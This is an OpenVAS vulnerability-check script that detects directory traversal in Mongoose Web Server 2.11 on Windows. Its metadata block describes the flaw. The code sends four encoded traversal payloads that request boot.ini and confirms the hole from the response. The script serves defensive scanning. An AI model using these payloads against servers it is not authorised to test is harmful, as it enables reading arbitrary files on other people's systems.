###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_mongoose_web_server_mult_dir_traversal_vuln.nasl 8287 2018-01-04 07:28:11Z teissa $
#
# Mongoose Web Server Multiple Directory Traversal Vulnerabilities
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_impact = "Successful exploitation will allow attackers to perform directory
traversal attacks and read arbitrary files on the affected application.

Impact Level: Application";

tag_affected = "Mongoose Web Server version 2.11 on windows.";

tag_insight = "The flaws are due to an error in validating backslashes in
the filenames.";

tag_solution = "No solution or patch was made available for at least one year
since disclosure of this vulnerability. Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective
features, remove the product or replace the product by another one.";

tag_summary = "The host is running Mongoose Web Server and is prone to multiple
directory traversal vulnerabilities.";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.801533");
  script_version("$Revision: 8287 $");
  script_tag(name:"last_modification", value:"$Date: 2018-01-04 08:28:11 +0100 (Thu, 04 Jan 2018) $");
  script_tag(name:"creation_date", value:"2010-11-02 18:01:36 +0100 (Tue, 02 Nov 2010)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_name("Mongoose Web Server Multiple Directory Traversal Vulnerabilities");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/15373/");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2010 Greenbone Networks GmbH");
  script_family("Web Servers");
  script_dependencies("find_service.nasl");
  script_require_ports("Services/www", 80, 8080);
  script_tag(name : "impact" , value : tag_impact);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
  script_tag(name:"solution_type", value:"WillNotFix");
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

## default port
moPort = 80;
if(!get_port_state(moPort))
{
  moPort = 8080;
  if(!get_port_state(moPort)){
    exit(0);
  }
}

banner = get_http_banner(port:moPort);
if(!banner || "Server:" >< banner){
 exit(0);
}

## List the possible exploits
exploits = make_list("/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/boot.ini",
                     "/%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\boot.ini",
                     "/%c0%2e%c0%2e%5c%c0%2e%c0%2e%5c%c0%2e%c0%2e%5cboot.ini",
                     "/%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5cboot.ini"
                    );

## Check for each exploit
foreach exp (exploits)
{
  ## Send the constructed exploit
  sndReq= http_get(item:exp, port:moPort);
  rcvRes = http_keepalive_send_recv(port:moPort, data:sndReq);

  ## Check the respone after sending exploit
  if(!isnull(rcvRes) && "[boot loader]" >< rcvRes && "\WINDOWS" >< rcvRes)
  {
    security_message(moPort);
    exit(0);
  }
}
